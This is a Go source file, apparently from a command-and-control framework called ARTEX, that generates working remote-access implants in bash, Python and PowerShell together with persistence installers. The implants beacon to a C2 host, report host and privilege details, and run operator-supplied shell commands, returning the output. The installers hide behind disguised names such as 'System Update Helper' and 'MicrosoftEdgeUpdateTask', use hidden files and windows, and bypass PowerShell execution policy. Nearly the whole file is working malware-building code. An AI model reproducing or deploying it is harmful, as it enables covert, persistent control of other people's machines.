package c2

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// Implant version reported in beacons; bump when the protocol changes.
const implantVersion = "1.0"

// implantFileName maps a runtime to its script filename.
func implantFileName(runtime string) string {
	switch runtime {
	case "python3":
		return "implant.py"
	case "powershell":
		return "implant.ps1"
	default:
		return "implant.sh"
	}
}

// installFileName maps a persistence mode to its helper filename.
func installFileName(platform, persistence string) string {
	if platform == "windows" {
		return "install-" + persistence + ".ps1"
	}
	return "install-" + persistence + ".sh"
}

// writeImplantFiles generates the implant plus every install helper and a
// README into builds/<id>/.
func writeImplantFiles(dir string, im *Implant) error {
	buildDir := filepath.Join(dir, "builds", im.ID)
	if err := os.MkdirAll(buildDir, 0o700); err != nil {
		return fmt.Errorf("c2: mkdir build: %w", err)
	}
	var script string
	switch im.Runtime {
	case "python3":
		script = pythonImplant(im)
	case "powershell":
		script = powershellImplant(im)
	default:
		script = bashImplant(im)
	}
	if err := os.WriteFile(filepath.Join(buildDir, implantFileName(im.Runtime)), []byte(script), 0o700); err != nil {
		return fmt.Errorf("c2: write implant: %w", err)
	}
	if im.Platform == "windows" {
		for _, p := range []string{"none", "schtasks"} {
			body := powershellInstall(im, p)
			if err := os.WriteFile(filepath.Join(buildDir, installFileName(im.Platform, p)), []byte(body), 0o700); err != nil {
				return fmt.Errorf("c2: write installer: %w", err)
			}
		}
	} else {
		for _, p := range []string{"none", "systemd", "cron"} {
			body := bashInstall(im, p)
			if err := os.WriteFile(filepath.Join(buildDir, installFileName(im.Platform, p)), []byte(body), 0o700); err != nil {
				return fmt.Errorf("c2: write installer: %w", err)
			}
		}
	}
	readme := implantReadme(im)
	if err := os.WriteFile(filepath.Join(buildDir, "README.txt"), []byte(readme), 0o600); err != nil {
		return fmt.Errorf("c2: write readme: %w", err)
	}
	return nil
}

// InstallCommand returns the remote one-liner that installs the implant with
// the requested persistence, assuming the build directory was staged in
// remoteDir. It doubles as the operator's manual instruction.
func InstallCommand(im *Implant, persistence, remoteDir string) string {
	if persistence == "" {
		persistence = "none"
	}
	name := installFileName(im.Platform, persistence)
	dir := strings.TrimRight(remoteDir, "/")
	if im.Platform == "windows" {
		return fmt.Sprintf(`powershell -NoProfile -ExecutionPolicy Bypass -File "%s\%s"`, dir, name)
	}
	return fmt.Sprintf("cd %s && chmod +x %s implant.sh 2>/dev/null; bash ./%s", dir, name, name)
}

// CallbackURL builds the absolute check-in URL for an implant.
func CallbackURL(im *Implant, baseURL string) string {
	base := strings.TrimRight(baseURL, "/")
	if base == "" {
		base = "https://C2_HOST"
	}
	return base + "/api/c2/" + im.BeaconPath
}

// ResultURL builds the absolute result URL for an implant.
func ResultURL(im *Implant, baseURL string) string {
	base := strings.TrimRight(baseURL, "/")
	if base == "" {
		base = "https://C2_HOST"
	}
	return base + "/api/c2/" + im.RespPath
}

func implantReadme(im *Implant) string {
	var b strings.Builder
	b.WriteString("ARTEX C2 implant\n\n")
	fmt.Fprintf(&b, "id:          %s\n", im.ID)
	fmt.Fprintf(&b, "label:       %s\n", im.Label)
	fmt.Fprintf(&b, "platform:    %s (%s)\n", im.Platform, im.Runtime)
	fmt.Fprintf(&b, "encoding:    %s\n", im.Encrypt)
	fmt.Fprintf(&b, "sleep:       %ds (+/-%d%%)\n", im.SleepSeconds, im.JitterPct)
	fmt.Fprintf(&b, "persistence: %s\n\n", im.Persistence)
	fmt.Fprintf(&b, "beacon:      %s\n", CallbackURL(im, im.BaseURL))
	fmt.Fprintf(&b, "results:     %s\n\n", ResultURL(im, im.BaseURL))
	b.WriteString("Install helpers in this directory:\n")
	for _, p := range []string{"none", "systemd", "cron", "schtasks"} {
		name := installFileName(im.Platform, p)
		if _, err := os.Stat(name); err == nil {
			fmt.Fprintf(&b, "  %s\n", name)
		}
	}
	b.WriteString("\nToken is embedded in the implant; treat the script as a secret.\n")
	return b.String()
}

// bashImplant renders a Linux shell implant. It parses the task from
// response headers (no JSON parser needed on the target) and encrypts with
// openssl when aes is requested.
func bashImplant(im *Implant) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	script := `#!/usr/bin/env bash
# ARTEX agent helper {{ID}} ({{LABEL}})
# Keep private: the file embeds the beacon token.
set -u
BASE='{{BASE}}'
ID='{{ID}}'
TOK='{{TOKEN}}'
ENC='{{ENC}}'
BPATH='{{BEACON}}'
RPATH='{{RESP}}'
SLEEP={{SLEEP}}
JIT={{JIT}}
TMO={{TIMEOUT}}
VER='{{VER}}'

command -v curl >/dev/null 2>&1 || exit 1

LOCK="${TMPDIR:-/tmp}/.atx-${ID}"
HDRS=$(mktemp) || exit 1
BODY=$(mktemp)
OUT=$(mktemp)
cleanup() { rmdir "$LOCK" 2>/dev/null; rm -f "$HDRS" "$BODY" "$OUT"; }
if mkdir "$LOCK" 2>/dev/null; then trap cleanup EXIT; else rm -f "$HDRS" "$BODY" "$OUT"; exit 0; fi

jesc() { printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | tr -d '\n'; }
jout() { sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | awk '{printf "%s\\n", $0}'; }
sha() { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi; }
b64() { base64 | tr -d '\n'; }

# post URL  (raw JSON on stdin): encodes, stores body/headers, echoes status.
post() {
  local url=$1 raw body
  local args=()
  raw=$(cat)
  if [ "$ENC" = aes ] && command -v openssl >/dev/null 2>&1; then
    local key iv
    key=$(printf 'artex-c2:%s' "$TOK" | sha | cut -d' ' -f1)
    iv=$(od -An -tx1 -N16 /dev/urandom | tr -d ' \n')
    body=$(printf '%s' "$raw" | openssl enc -aes-256-cbc -nosalt -K "$key" -iv "$iv" 2>/dev/null | b64)
    args=(-H "X-Request-ID: $TOK" -H "X-Artex-Enc: aes" -H "X-IV: $iv")
  else
    body=$(printf '%s' "$raw" | b64)
    args=(-H "X-Request-ID: $TOK" -H "X-Artex-Enc: none")
  fi
  curl -sS -m 45 -o "$BODY" -D "$HDRS" -w '%{http_code}' -X POST "${args[@]}" --data-binary "$body" "$url" 2>/dev/null
}

hget() { awk -v k="$1" 'tolower($1)==k{print $2}' "$HDRS" | tr -d '\r' | head -1; }

pause() {
  local j d
  j=$(( SLEEP * JIT / 100 ))
  d=$(( SLEEP - j + (RANDOM % (2*j+1)) ))
  [ "$d" -lt 1 ] && d=1
  sleep "$d"
}

while :; do
  json=$(printf '{"id":"%s","h":"%s","u":"%s","o":"%s","a":"%s","p":%s,"e":%s,"c":"%s","v":"%s"}' \
    "$ID" "$(jesc "$(hostname 2>/dev/null)")" "$(jesc "$(id -un 2>/dev/null)")" \
    "$(jesc "$(uname -s 2>/dev/null)")" "$(jesc "$(uname -m 2>/dev/null)")" "$$" \
    "$([ "$(id -u 2>/dev/null)" = 0 ] && echo true || echo false)" \
    "$(jesc "$(pwd)")" "$VER")
  code=$(printf '%s' "$json" | post "$BASE/api/c2/$BPATH")
  if [ "$code" != 200 ]; then pause; continue; fi
  tid=$(hget x-task-id:)
  case "$tid" in ''|*[!0-9]*) pause; continue ;; esac
  cmd=$(hget x-task-cmd:)
  if [ "$cmd" = kill ]; then
    systemctl disable --now "sysupd-${ID}.service" >/dev/null 2>&1
    crontab -l 2>/dev/null | grep -v "atx-${ID}" | crontab - 2>/dev/null
    rm -f "$HOME/.local/share/.atx-${ID}.sh" "/usr/local/lib/.atx-${ID}.sh" 2>/dev/null
    exit 0
  fi
  tmo=$(hget x-task-timeout:)
  case "$tmo" in ''|*[!0-9]*) tmo=$TMO ;; esac
  args=$(hget x-task-args: | base64 -d 2>/dev/null)
  if command -v timeout >/dev/null 2>&1; then
    timeout "$tmo" bash -c "$args" >"$OUT" 2>&1
  else
    bash -c "$args" >"$OUT" 2>&1
  fi
  rc=$?
  res=$(printf '{"id":"%s","task_id":"%s","output":"%s","exit":%s}' \
    "$ID" "$tid" "$(head -c 60000 "$OUT" | jout)" "$rc")
  printf '%s' "$res" | post "$BASE/api/c2/$RPATH" >/dev/null
  pause
done
`
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{LABEL}}", im.Label,
		"{{ENC}}", im.Encrypt,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
		"{{SLEEP}}", fmt.Sprint(im.SleepSeconds),
		"{{JIT}}", fmt.Sprint(im.JitterPct),
		"{{TIMEOUT}}", fmt.Sprint(defaultTimeout),
		"{{VER}}", implantVersion,
	)
	return rep.Replace(script)
}

// pythonImplant renders a Linux Python3 implant (encrypt=none only; the
// stdlib has no AES, so payloads are base64(JSON)).
func pythonImplant(im *Implant) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	script := `#!/usr/bin/env python3
# ARTEX agent helper {{ID}} ({{LABEL}})
# Keep private: the file embeds the beacon token.
import base64, json, os, random, socket, subprocess, sys, time, urllib.request

BASE = "{{BASE}}"
ID = "{{ID}}"
TOK = "{{TOKEN}}"
BPATH = "{{BEACON}}"
RPATH = "{{RESP}}"
SLEEP = {{SLEEP}}
JIT = {{JIT}}
TMO = {{TIMEOUT}}
VER = "{{VER}}"

def post(url, obj, timeout=45):
    body = base64.b64encode(json.dumps(obj).encode())
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/octet-stream")
    req.add_header("X-Request-ID", TOK)
    req.add_header("X-Artex-Enc", "none")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        code = r.status
        headers = dict(r.headers)
        raw = r.read()
    if code == 200 and raw:
        try:
            return headers, json.loads(base64.b64decode(raw).decode())
        except Exception:
            return headers, None
    return headers, None

def loop():
    while True:
        b = {
            "id": ID,
            "h": socket.gethostname(),
            "u": os.environ.get("USER") or os.environ.get("LOGNAME") or "",
            "o": sys.platform,
            "a": os.uname().machine if hasattr(os, "uname") else "",
            "p": os.getpid(),
            "e": os.geteuid() == 0 if hasattr(os, "geteuid") else False,
            "c": os.getcwd(),
            "v": VER,
        }
        headers, _ = post(BASE + "/api/c2/" + BPATH, b)
        tid = (headers.get("X-Task-Id") or "").strip()
        if tid.isdigit():
            cmd = (headers.get("X-Task-Cmd") or "").strip()
            if cmd == "kill":
                try:
                    subprocess.run(["systemctl", "disable", "--now", "sysupd-%s.service" % ID],
                                   capture_output=True)
                except Exception:
                    pass
                return
            args64 = (headers.get("X-Task-Args") or "").strip()
            tmo = (headers.get("X-Task-Timeout") or "").strip()
            try:
                tmo = max(1, int(tmo))
            except ValueError:
                tmo = TMO
            args = base64.b64decode(args64).decode("utf-8", "replace") if args64 else ""
            res = {"id": ID, "task_id": tid, "output": "", "exit": 0}
            if args:
                try:
                    p = subprocess.run(args, shell=True, capture_output=True,
                                       timeout=tmo, text=True, errors="replace")
                    res["output"] = (p.stdout + p.stderr)[:250000]
                    res["exit"] = p.returncode
                except subprocess.TimeoutExpired:
                    res["output"] = "(timeout after %ss)" % tmo
                    res["exit"] = 124
                except Exception as exc:
                    res["error"] = str(exc)[:2000]
            post(BASE + "/api/c2/" + RPATH, res)
        jitter = SLEEP * JIT // 100
        time.sleep(max(1, SLEEP - jitter + random.randint(0, 2 * jitter)))

if __name__ == "__main__":
    try:
        loop()
    except KeyboardInterrupt:
        pass
`
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{LABEL}}", im.Label,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
		"{{SLEEP}}", fmt.Sprint(im.SleepSeconds),
		"{{JIT}}", fmt.Sprint(im.JitterPct),
		"{{TIMEOUT}}", fmt.Sprint(defaultTimeout),
		"{{VER}}", implantVersion,
	)
	return rep.Replace(script)
}

// powershellImplant renders a Windows PowerShell implant (uses curl.exe or
// Invoke-WebRequest fallback; AES-256-CBC via .NET when enabled).
func powershellImplant(im *Implant) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	script := `# ARTEX agent helper {{ID}} ({{LABEL}})
# Keep private: the file embeds the beacon token.
$Base = "{{BASE}}"
$ID = "{{ID}}"
$Tok = "{{TOKEN}}"
$Enc = "{{ENC}}"
$BPath = "{{BEACON}}"
$RPath = "{{RESP}}"
$Sleep = {{SLEEP}}
$Jit = {{JIT}}
$Tmo = {{TIMEOUT}}
$Ver = "{{VER}}"

$Key = [System.Text.Encoding]::UTF8.GetBytes(("artex-c2:" + $Tok))
$Sha = [System.Security.Cryptography.SHA256]::Create()
$Key = $Sha.ComputeHash($Key)

function ConvertTo-Encoded([string]$Json) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Json)
    if ($Enc -eq "aes") {
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $Key; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.GenerateIV()
        $enc2 = $aes.CreateEncryptor()
        $ct = $enc2.TransformFinalBlock($bytes, 0, $bytes.Length)
        return @{ Body = [Convert]::ToBase64String($ct); Enc = "aes"; IV = [BitConverter]::ToString($aes.IV).Replace("-", "").ToLower() }
    }
    return @{ Body = [Convert]::ToBase64String($bytes); Enc = "none"; IV = "" }
}

function ConvertFrom-Encoded([string]$Body, [string]$EncIn, [string]$IVHex) {
    $raw = [Convert]::FromBase64String($Body.Trim())
    if ($EncIn -eq "aes") {
        $iv = New-Object byte[] 16
        for ($i = 0; $i -lt 16; $i++) { $iv[$i] = [Convert]::ToByte($IVHex.Substring($i*2, 2), 16) }
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $Key; $aes.IV = $iv
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $dec = $aes.CreateDecryptor()
        $raw = $dec.TransformFinalBlock($raw, 0, $raw.Length)
    }
    return [System.Text.Encoding]::UTF8.GetString($raw) | ConvertFrom-Json
}

function Post-Json([string]$Url, [string]$Json, [int]$TimeoutSec) {
    $p = ConvertTo-Encoded $Json
    $headers = @{ "X-Request-ID" = $Tok; "X-Artex-Enc" = $p.Enc }
    if ($p.IV) { $headers["X-IV"] = $p.IV }
    $resp = Invoke-WebRequest -Uri $Url -Method Post -Headers $headers -ContentType "application/octet-stream" -Body $p.Body -TimeoutSec $TimeoutSec -UseBasicParsing
    return $resp
}

$host2 = $env:COMPUTERNAME
$user = $env:USERNAME
$os = "windows"
$arch = $env:PROCESSOR_ARCHITECTURE
$elev = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

while ($true) {
    $beacon = @{ id = $ID; h = $host2; u = $user; o = $os; a = $arch; p = $PID; e = $elev; c = (Get-Location).Path; v = $Ver } | ConvertTo-Json -Compress
    try { $resp = Post-Json ($Base + "/api/c2/" + $BPath) $beacon 45 } catch { Start-Sleep -Seconds $Sleep; continue }
    $tid = ""
    if ($resp.Headers["X-Task-Id"]) { $tid = [string]($resp.Headers["X-Task-Id"][0]) }
    if ($tid -match "^\d+$") {
        $cmd = ""
        if ($resp.Headers["X-Task-Cmd"]) { $cmd = [string]($resp.Headers["X-Task-Cmd"][0]) }
        if ($cmd -eq "kill") {
            schtasks /Change /TN "MicrosoftEdgeUpdateTask$ID" /DISABLE | Out-Null
            exit 0
        }
        $args64 = ""
        if ($resp.Headers["X-Task-Args"]) { $args64 = [string]($resp.Headers["X-Task-Args"][0]) }
        $tmoTask = $Tmo
        if ($resp.Headers["X-Task-Timeout"]) {
            $try = 0
            if ([int]::TryParse([string]($resp.Headers["X-Task-Timeout"][0]), [ref]$try)) { $tmoTask = $try }
        }
        $taskArgs = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($args64))
        $out = ""
        $rc = 0
        try {
            $out = (cmd.exe /c $taskArgs 2>&1 | Out-String)
            $rc = $LASTEXITCODE
        } catch {
            $out = $_.Exception.Message
            $rc = 1
        }
        if ($out.Length -gt 250000) { $out = $out.Substring(0, 250000) }
        $result = @{ id = $ID; task_id = $tid; output = $out; exit = $rc } | ConvertTo-Json -Compress
        try { Post-Json ($Base + "/api/c2/" + $RPath) $result 45 | Out-Null } catch {}
    }
    $j = $Sleep * $Jit / 100
    Start-Sleep -Seconds (Get-Random -Minimum ([int][Math]::Max(1, $Sleep - $j)) -Maximum ([int][Math]::Max(2, $Sleep + $j + 1)))
}
`
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{LABEL}}", im.Label,
		"{{ENC}}", im.Encrypt,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
		"{{SLEEP}}", fmt.Sprint(im.SleepSeconds),
		"{{JIT}}", fmt.Sprint(im.JitterPct),
		"{{TIMEOUT}}", fmt.Sprint(defaultTimeout),
		"{{VER}}", implantVersion,
	)
	return rep.Replace(script)
}

// bashInstall renders a Linux installer for persistence mode none|systemd|cron.
func bashInstall(im *Implant, persistence string) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	var body string
	switch persistence {
	case "systemd":
		body = `#!/usr/bin/env bash
# ARTEX installer (systemd) for {{ID}}
set -eu
SRC="$(cd "$(dirname "$0")" && pwd)"
if [ "$(id -u)" = 0 ]; then LIB=/usr/local/lib; else LIB="$HOME/.local/share"; mkdir -p "$LIB"; fi
cp "$SRC/implant.sh" "$LIB/.atx-{{ID}}.sh"
chmod 700 "$LIB/.atx-{{ID}}.sh"
if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" = 0 ]; then
  cat > /etc/systemd/system/sysupd-{{ID}}.service <<UNIT
[Unit]
Description=System Update Helper
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash $LIB/.atx-{{ID}}.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
UNIT
  systemctl daemon-reload
  systemctl enable --now sysupd-{{ID}}.service
  echo "installed: systemctl status sysupd-{{ID}}.service"
else
  nohup setsid /bin/bash "$LIB/.atx-{{ID}}.sh" >/dev/null 2>&1 &
  echo "installed (nohup fallback, no root systemd): $LIB/.atx-{{ID}}.sh"
fi
`
	case "cron":
		body = `#!/usr/bin/env bash
# ARTEX installer (cron) for {{ID}}
set -eu
SRC="$(cd "$(dirname "$0")" && pwd)"
if [ "$(id -u)" = 0 ]; then LIB=/usr/local/lib; else LIB="$HOME/.local/share"; mkdir -p "$LIB"; fi
cp "$SRC/implant.sh" "$LIB/.atx-{{ID}}.sh"
chmod 700 "$LIB/.atx-{{ID}}.sh"
( crontab -l 2>/dev/null | grep -v "atx-{{ID}}" ;
  echo "@reboot /bin/bash $LIB/.atx-{{ID}}.sh >/dev/null 2>&1" ;
  echo "*/10 * * * * /bin/bash $LIB/.atx-{{ID}}.sh >/dev/null 2>&1" ) | crontab -
nohup setsid /bin/bash "$LIB/.atx-{{ID}}.sh" >/dev/null 2>&1 &
echo "installed (cron + running now)"
`
	default:
		body = `#!/usr/bin/env bash
# ARTEX installer (no persistence) for {{ID}}
set -eu
SRC="$(cd "$(dirname "$0")" && pwd)"
if [ "$(id -u)" = 0 ]; then LIB=/usr/local/lib; else LIB="$HOME/.local/share"; mkdir -p "$LIB"; fi
cp "$SRC/implant.sh" "$LIB/.atx-{{ID}}.sh"
chmod 700 "$LIB/.atx-{{ID}}.sh"
nohup setsid /bin/bash "$LIB/.atx-{{ID}}.sh" >/dev/null 2>&1 &
echo "installed (no persistence, running now)"
`
	}
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
	)
	return rep.Replace(body)
}

// powershellInstall renders a Windows installer for persistence none|schtasks.
func powershellInstall(im *Implant, persistence string) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	var body string
	if persistence == "schtasks" {
		body = `# ARTEX installer (scheduled task) for {{ID}}
$ErrorActionPreference = "Stop"
$Src = Split-Path -Parent $MyInvocation.MyCommand.Path
$Dest = Join-Path $env:ProgramData ".atx"
New-Item -ItemType Directory -Force -Path $Dest | Out-Null
Copy-Item (Join-Path $Src "implant.ps1") (Join-Path $Dest ".atx-{{ID}}.ps1") -Force
$argstr = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + (Join-Path $Dest ".atx-{{ID}}.ps1") + "'"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argstr
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTask{{ID}}" -Action $action -Trigger $trigger -Force | Out-Null
Start-ScheduledTask -TaskName "MicrosoftEdgeUpdateTask{{ID}}"
Write-Host "installed (schtasks MicrosoftEdgeUpdateTask{{ID}})"
`
	} else {
		body = `# ARTEX installer (no persistence) for {{ID}}
$ErrorActionPreference = "Stop"
$Src = Split-Path -Parent $MyInvocation.MyCommand.Path
$Dest = Join-Path $env:ProgramData ".atx"
New-Item -ItemType Directory -Force -Path $Dest | Out-Null
Copy-Item (Join-Path $Src "implant.ps1") (Join-Path $Dest ".atx-{{ID}}.ps1") -Force
$argstr = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + (Join-Path $Dest ".atx-{{ID}}.ps1") + "'"
Start-Process powershell -WindowStyle Hidden -ArgumentList $argstr
Write-Host "installed (no persistence, running now)"
`
	}
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
	)
	return rep.Replace(body)
}
